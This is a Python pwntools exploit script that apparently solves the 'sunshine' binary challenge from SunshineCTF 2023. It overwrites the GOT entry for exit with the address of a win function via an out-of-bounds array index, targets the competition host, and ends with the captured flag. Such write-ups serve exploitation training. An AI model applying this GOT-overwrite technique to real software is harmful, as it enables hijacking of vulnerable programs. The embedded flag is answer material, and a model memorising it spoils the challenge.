#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./sunshine_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chal.2023.sunshinectf.games", 23003)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = (exe.got['exit'] - exe.sym['fruits']) // 8
	success(f'{offset=}')

	r.sendlineafter(b'>>>', str(offset).encode())
	r.sendlineafter(b'>>>', p64(exe.sym['win']))

	r.interactive()


if __name__ == "__main__":
	main()

# sun{a_ray_of_sunshine_bouncing_around}
